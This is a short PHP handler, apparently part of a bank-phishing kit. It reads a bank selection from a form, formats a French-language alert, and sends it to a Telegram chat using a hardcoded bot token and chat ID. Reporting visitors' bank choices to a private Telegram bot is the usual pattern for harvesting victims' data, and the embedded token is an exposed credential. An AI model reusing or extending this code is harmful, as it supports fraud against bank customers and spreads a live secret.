<?php
// Configuration Telegram
$TELEGRAM_BOT_TOKEN = "5529205468:AAEmNwJzZ0oQ4X_RVS0vhEL_GO4xpaytvwE";
$TELEGRAM_CHAT_ID = "5061239044";

// Récupérer la banque sélectionnée
$banque = isset($_POST['bq']) ? sanitize_input($_POST['bq']) : 'Non spécifiée';

// Préparer le message
$message = "✅ Nouvelle sélection de banque\n";
$message .= "================================\n";
$message .= "Banque: " . $banque . "\n";
$message .= "Date: " . date('d/m/Y H:i:s') . "\n";
$message .= "================================\n";

// Envoyer à Telegram
send_to_telegram($message);

// Fonction pour envoyer à Telegram
function send_to_telegram($text) {
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    
    $url = "https://api.telegram.org/bot" . $TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = array(
        'chat_id' => $TELEGRAM_CHAT_ID,
        'text' => $text,
        'parse_mode' => 'HTML'
    );
    
    $options = array(
        'http' => array(
            'method'  => 'POST',
            'header'  => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        )
    );
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    return $result;
}

// Fonction pour nettoyer les données
function sanitize_input($data) {
    return htmlspecialchars(strip_tags($data), ENT_QUOTES, 'UTF-8');
}

// Redirection ou réponse
header('Content-Type: application/json');
echo json_encode(['status' => 'success', 'message' => 'Sélection envoyée à Telegram']);
?>
